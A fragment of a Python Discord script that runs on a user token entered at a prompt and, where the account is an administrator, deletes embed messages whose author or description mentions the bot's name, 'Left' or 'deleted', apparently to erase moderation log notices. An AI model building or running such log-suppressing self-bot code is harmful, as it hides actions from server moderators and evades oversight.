            message.guild.me.guild_permissions.administrator: return
    delete_message = False
    if len(message.embeds) > 0:
        if hasattr(message.embeds[0], "author"):
            if message.embeds[0].author:
                if bot.user.name in message.embeds[0].author.name:
                    delete_message = True
                if "Left" in message.embeds[0].author.name:
                    delete_message = True
        if hasattr(message.embeds[0], "description"):
            if "deleted" in message.embeds[0].description.lower():
                delete_message = True
    if not delete_message: return
    try:
        await message.delete()
    except discord.Forbidden:
        print(f"Failed to delete message in {message.channel.name}: Forbidden.")
    except discord.NotFound:
        print(f"Failed to delete message in {message.channel.name}: Not Found.")
    except discord.HTTPException:
        print(f"Failed to delete message in {message.channel.name}: HTTPException.")
    return


# Get the token and run the bot
user_token = input("Input user token: ")

token_pattern = r'[MNO][a-zA-Z\d_-]{23,25}\.[a-zA-Z\d_-]{6}\.[a-zA-Z\d_-]{27}'

if not re.match(token_pattern, user_token):
    print("Bad User Token sensed. Please check for bad characters.")
    print("Continue with bad token? Script will do nothing if it is bad.")
    question = input("Type [Yes/No]: ")
    answer = question.lower().strip()
    if answer == "no":
        quit()
    elif answer != "yes":
        print("Invalid input, quitting.")
        quit()

bot.run(user_token)
